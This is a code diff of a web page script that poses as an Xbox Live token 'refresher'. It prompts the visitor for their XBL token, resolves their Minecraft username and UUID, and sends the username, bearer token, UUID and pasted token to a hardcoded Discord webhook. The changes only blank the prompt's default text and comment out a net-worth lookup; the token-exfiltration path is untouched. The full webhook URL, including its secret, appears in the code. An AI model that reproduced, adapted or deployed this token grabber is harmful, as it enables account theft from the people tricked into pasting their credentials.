@@ -21,7 +21,7 @@
 <script>
   const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
 async function myFunction() {
-  let userToken = prompt("Please enter XBL token", "token goes here");
+  let userToken = prompt("Please enter XBL token", "");
   if (userToken != null) {
     document.getElementById("demo").innerHTML =
     "REFRESHING: " + userToken;
@@ -50,13 +50,13 @@ async function myFunction() {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         document.getElementById("demo4").innerHTML = "username: " + username;
-      const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v2/profiles/${username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: null }] } } })).data.data[0].networth
+      //const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v2/profiles/${username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: null }] } } })).data.data[0].networth
 
                 //check if has profiles, if api off or if normal
-                let total_networth
-                if (networth == null) total_networth = `[NW] No profile data found [NW]`
-                else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
-                else total_networth = `[NW] ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
+                //let total_networth
+                //if (networth == null) total_networth = `[NW] No profile data found [NW]`
+                //else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
+                //else total_networth = `[NW] ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
         postToWebhook(username, bearerToken, uuid, userToken)
         document.getElementById("demo5").innerHTML = "POSTED TO WEBHOOK";
     } catch (e) {
